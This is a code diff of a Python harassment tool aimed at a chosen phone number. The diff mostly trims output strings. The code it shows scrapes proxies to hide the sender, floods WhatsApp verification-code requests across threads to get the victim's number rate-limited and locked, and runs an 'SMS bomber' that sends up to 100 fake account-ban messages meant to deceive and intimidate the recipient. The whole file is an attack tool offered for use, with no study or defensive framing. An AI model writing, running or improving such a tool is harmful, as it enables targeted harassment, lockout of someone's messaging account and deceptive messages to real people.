@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
 import os, sys, time, random, threading, requests
-from datetime import datetime
 
 R = "\033[91m"; P = "\033[95m"; Y = "\033[93m"; G = "\033[92m"
 C = "\033[96m"; B = "\033[90m"; RS = "\033[0m"
@@ -27,10 +26,10 @@ def fetch_and_test_proxies():
             except:
                 continue
         raw = list(set(raw))
-        print(f"{C}[*] Testing {len(raw)} proxies (this may take 30 sec)...{RS}")
+        print(f"{C}[*] Testing {len(raw)} proxies...{RS}")
         working = []
         test_url = "https://web.whatsapp.com"
-        for p in raw[:50]:  # test first 50 to save time
+        for p in raw[:50]:
             try:
                 proxies = {"http": "http://"+p, "https": "http://"+p}
                 r = requests.get(test_url, proxies=proxies, timeout=5)
@@ -41,12 +40,12 @@ def fetch_and_test_proxies():
                 continue
         if working:
             PROXIES = working
-            print(f"{G}[+] {len(PROXIES)} working proxies found.{RS}")
+            print(f"{G}[+] {len(PROXIES)} working proxies.{RS}")
         else:
-            print(f"{R}[!] No working proxies. Using direct connection (your IP will be exposed).{RS}")
-            PROXIES = [None]  # fallback to direct
+            print(f"{R}[!] No working proxies. Using direct connection (your IP will show).{RS}")
+            PROXIES = [None]
     except Exception as e:
-        print(f"{R}[!] Error: {e}. Using direct connection.{RS}")
+        print(f"{R}[!] Error: {e}. Using direct.{RS}")
         PROXIES = [None]
 
 def get_proxy():
@@ -56,7 +55,7 @@ def get_proxy():
         return None
     return {"http": "http://" + random.choice(PROXIES), "https": "http://" + random.choice(PROXIES)}
 
-# ========== ATTACK: VERIFICATION CODE SPAM ==========
+# ========== CODE SPAM (WORKS) ==========
 def code_spam(number, cycle):
     proxy = get_proxy()
     headers = {
@@ -89,7 +88,7 @@ def code_spam(number, cycle):
 
 def multi_attack(number):
     fetch_and_test_proxies()
-    print(f"{Y}[+] Attacking {number} with code spam. {'Using proxies' if PROXIES[0] else 'Direct (no proxy)'}.{RS}")
+    print(f"{Y}[+] Attacking {number} with code spam. {'Proxy' if PROXIES[0] else 'Direct'}.{RS}")
     threads = 15
     cycles = 100
     for c in range(1, cycles+1):
@@ -103,114 +102,114 @@ def multi_attack(number):
         if c % 10 == 0:
             print(f"{C}[*] {c}/{cycles} done{RS}")
         time.sleep(random.uniform(0.5, 1.0))
-    print(f"{G}[✔] Attack finished. WhatsApp will rate-limit and temporarily lock {number} within 10-30 min.{RS}")
+    print(f"{G}[✔] Attack done. Rate-limit triggered. Ban in 10-30 min.{RS}")
 
-# ========== SMS BOMBER (100 BAN TEXTS) ==========
+# ========== SMS BOMBER ==========
 BAN_TEXTS = [
     "Your WhatsApp account has been permanently banned.",
     "Account suspended due to spam.",
     "Unusual activity detected. Account locked.",
-    "Fraud alert: Number blocked from WhatsApp.",
-    "Multiple complaints. Account deactivated.",
-    "Messages reported as harassment. Account terminated.",
-    "Security violation. Access revoked.",
-    "WhatsApp disabled your account for abuse.",
-    "Impersonation reported. Account banned.",
-    "Your phone number is no longer registered.",
-    "Illegal activity detected. Account frozen.",
-    "Under investigation. Temporary ban.",
-    "Spam triggered automatic ban.",
-    "Flagged for permanent restriction.",
-    "Reported for fake news. Banned.",
-    "Access revoked immediately.",
-    "Policy violation. Account closed.",
+    "Fraud alert: Number blocked.",
+    "Multiple complaints. Deactivated.",
+    "Harassment reported. Terminated.",
+    "Security violation. Revoked.",
+    "Disabled for abuse.",
+    "Impersonation. Banned.",
+    "Number no longer registered.",
+    "Illegal activity. Frozen.",
+    "Under investigation. Temp ban.",
+    "Spam triggered auto-ban.",
+    "Flagged. Permanent restriction.",
+    "Fake news reported. Banned.",
+    "Access revoked.",
+    "Policy violation. Closed.",
     "Offensive messages. Disabled.",
     "Suspicious logins. Locked.",
-    "Number blacklisted.",
-    "Not authorized to use WhatsApp.",
-    "Compromised and banned for safety.",
+    "Blacklisted.",
+    "Not authorized.",
+    "Compromised. Banned.",
     "Harassment confirmed. Terminated.",
-    "Community guidelines violated. Banned.",
-    "Permanently blocked from our service.",
-    "Deactivated upon user reports.",
-    "Malicious purposes. Banned.",
-    "Banned from WhatsApp for life.",
-    "Repeated violations. Permanently suspended.",
+    "Guidelines violated. Banned.",
+    "Permanently blocked.",
+    "Deactivated per reports.",
+    "Malicious use. Banned.",
+    "Banned for life.",
+    "Repeated violations. Suspended.",
     "Phone number banned.",
-    "Promoting violence. Terminated.",
+    "Violence promotion. Terminated.",
     "Inappropriate content. Banned.",
     "Restricted indefinitely.",
     "Terms violated. Account closed.",
     "Number no longer associated.",
-    "Removed due to spam complaints.",
+    "Removed for spam.",
     "Automated ban triggered.",
-    "Disabled after multiple warnings.",
+    "Disabled after warnings.",
     "Locked for security.",
-    "Reported for fraud. Banned.",
-    "Access permanently removed.",
-    "Flagged as unsafe. Banned.",
+    "Fraud reported. Banned.",
+    "Access removed.",
+    "Flagged unsafe. Banned.",
     "Illegal content. Deactivated.",
     "Threatening messages. Banned.",
-    "Terminated by our team.",
-    "Prohibited from using WhatsApp.",
+    "Terminated by team.",
+    "Prohibited from using.",
     "Scam used. Permanently banned.",
-    "Intellectual property violation. Disabled.",
-    "Caused harm to others. Banned.",
+    "IP violation. Disabled.",
+    "Harm to others. Banned.",
     "No longer active.",
-    "Removed from database.",
+    "Removed from DB.",
     "Risk to community. Banned.",
-    "Under permanent ban.",
-    "Impersonation reported. Banned.",
+    "Permanent ban.",
+    "Impersonation. Banned.",
     "Excessive complaints. Locked.",
     "Blocked from services.",
     "Bulk messaging. Banned.",
-    "Anti-spam violation. Account closed.",
-    "Appeal contact provided.",
-    "Flagged for malicious activity.",
+    "Anti-spam. Closed.",
+    "Appeal available.",
+    "Malicious activity flagged.",
     "Effective immediately.",
     "No reinstatement.",
-    "Copyright infringement. Disabled.",
+    "Copyright violation. Disabled.",
     "Abusive messages. Banned.",
-    "Unauthorized clients. Banned.",
-    "Suspended pending investigation.",
-    "Listed as threat. Banned.",
+    "Unauthorized client. Banned.",
+    "Pending investigation.",
+    "Threat listed. Banned.",
     "Permanently disabled.",
     "Terms broken. Terminated.",
     "Illegal transactions. Banned.",
-    "Blacklisted for spam.",
-    "Closed at request of others.",
+    "Spam blacklist.",
+    "Closed by request.",
     "Harmful activity. Banned.",
     "Access cut off.",
-    "Banned from all services.",
+    "Banned from all.",
     "Deactivated by system.",
     "Number invalid.",
-    "Excessive reporting against you.",
+    "Excessive reporting.",
     "Suspicious behavior. Locked.",
-    "Messages violated policy. Banned.",
+    "Policy violation. Banned.",
     "Permanently removed.",
-    "Flagged for fraud. Banned.",
+    "Fraud flag. Banned.",
     "Review disabled.",
     "Account frozen.",
     "Security breach. Banned.",
-    "Malware spreading. Banned.",
+    "Malware spread. Banned.",
     "No appeals.",
-    "Bullying reported. Banned.",
+    "Bullying. Banned.",
     "Fake identity. Terminated.",
-    "Phishing used. Banned.",
-    "Considered spam. Locked.",
+    "Phishing. Banned.",
+    "Spam classification. Locked.",
     "Permanently restricted.",
-    "Not allowed anymore.",
+    "Not allowed.",
     "Child safety violation. Disabled.",
     "Removed from WhatsApp.",
-    "Harassment used. Banned.",
-    "Access permanently denied.",
-    "Abusing platform. Banned.",
+    "Harassment. Banned.",
+    "Access denied.",
+    "Platform abuse. Banned.",
     "Permanent lock.",
     "All features banned.",
     "Suspicious activity. Terminated.",
     "Dangerous messages. Banned.",
     "Deleted by system.",
-    "Do not attempt to register."
+    "Do not register."
 ]
 
 def sms_bomber():
@@ -218,7 +217,7 @@ def sms_bomber():
     count = int(input(f"{Y}[+] SMS count (max 100): {RS}") or 100)
     if count > 100: count = 100
     fetch_and_test_proxies()
-    print(f"{C}[*] Sending {count} ban texts to {num}...{RS}")
+    print(f"{C}[*] Sending {count} texts...{RS}")
     for i in range(count):
         proxy = get_proxy()
         msg = random.choice(BAN_TEXTS)
@@ -232,13 +231,12 @@ def sms_bomber():
             if r.json().get("success"):
                 print(f"{G}[{i+1}] SMS sent: {msg[:30]}...{RS}")
             else:
-                print(f"{R}[{i+1}] Failed (API limit){RS}")
+                print(f"{R}[{i+1}] Failed{RS}")
         except Exception as e:
             print(f"{R}[{i+1}] Error: {str(e)[:20]}{RS}")
         time.sleep(random.uniform(0.3, 0.7))
-    print(f"{G}[✔] SMS bombing done.{RS}")
+    print(f"{G}[✔] SMS bomb done.{RS}")
 
-# ========== MENU ==========
 def menu():
     while True:
         clear()
@@ -256,7 +254,7 @@ def menu():
         print(f"{B}   powered by dinuwa xmd{RS}")
         print(f"{C}   {'='*45}{RS}")
         print(f"{Y}  [1] Code Spam (WhatsApp Lock){RS}")
-        print(f"{Y}  [2] SMS Bomber (100 Ban Texts){RS}")
+        print(f"{Y}  [2] SMS Bomber (100 Texts){RS}")
         print(f"{R}  [3] Exit{RS}")
         ch = input("Select: ")
         if ch == "1":
